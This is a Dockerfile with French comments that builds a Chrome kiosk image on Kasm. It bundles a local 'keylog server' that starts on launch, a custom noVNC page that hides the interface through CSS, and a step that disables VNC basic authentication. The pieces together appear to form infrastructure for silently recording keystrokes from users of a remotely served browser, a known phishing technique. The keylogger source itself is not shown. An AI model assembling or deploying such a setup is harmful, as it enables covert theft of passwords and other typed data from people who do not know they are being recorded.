FROM kasmweb/chrome:1.17.0

USER root

# Node pour le keylog server
RUN apt-get update && apt-get install -y --no-install-recommends nodejs npm ca-certificates \
    && apt-get clean && rm -rf /var/lib/apt/lists/*

# --- Fichiers appli ---
# Page noVNC custom (on ne supprime pas l’UI côté JS, on la masque via CSS dans le fichier)
COPY index.html /usr/share/kasmvnc/www/index.html
# Serveur keylog local
COPY keylog_server.js /usr/local/bin/keylog_server.js
# (Option) Générer un certificat auto-signé si self.pem absent
# -> ainsi le serveur HTTPS démarre toujours
RUN if [ ! -f /home/kasm-user/.vnc/self.pem ]; then \
      mkdir -p /home/kasm-user/.vnc && \
      openssl req -x509 -nodes -newkey rsa:2048 -days 3650 \
        -keyout /home/kasm-user/.vnc/self.pem \
        -out /home/kasm-user/.vnc/self.pem \
        -subj "/CN=localhost"; \
    fi && \
    chown -R kasm-user:kasm-user /home/kasm-user/.vnc && \
    chmod 600 /home/kasm-user/.vnc/self.pem
# Scripts perso
COPY kiosk-start.sh /usr/local/bin/kiosk-start.sh
COPY wait-for-x.sh   /usr/local/bin/wait-for-x.sh

# Autostart (Xfce)
RUN mkdir -p /home/kasm-user/.config/autostart
COPY chrome-kiosk.desktop /home/kasm-user/.config/autostart/chrome-kiosk.desktop

# --- Fix permissions
# Scripts: exécutables
RUN chmod +x /usr/local/bin/kiosk-start.sh \
    && chmod +x /usr/local/bin/wait-for-x.sh \
    && chmod +x /usr/local/bin/keylog_server.js

# Autostart: fichier desktop lisible, pas besoin d’exec
RUN chmod 644 /home/kasm-user/.config/autostart/chrome-kiosk.desktop

# Propriété vers l’utilisateur kasm-user
RUN chown -R kasm-user:kasm-user /usr/share/kasmvnc/www /home/kasm-user/.config

# Optionnel: désactiver l’auth basique noVNC si tu veux aucune demande
RUN sed -i 's/\bvncserver\b/vncserver -disableBasicAuth/' /dockerstartup/vnc_startup.sh

# Wrapper qui démarre le keylog server puis le startup Kasm
COPY startup-wrapper.sh /usr/local/bin/startup-wrapper.sh
RUN chmod +x /usr/local/bin/startup-wrapper.sh

USER 1000

ENTRYPOINT ["/usr/local/bin/startup-wrapper.sh"]
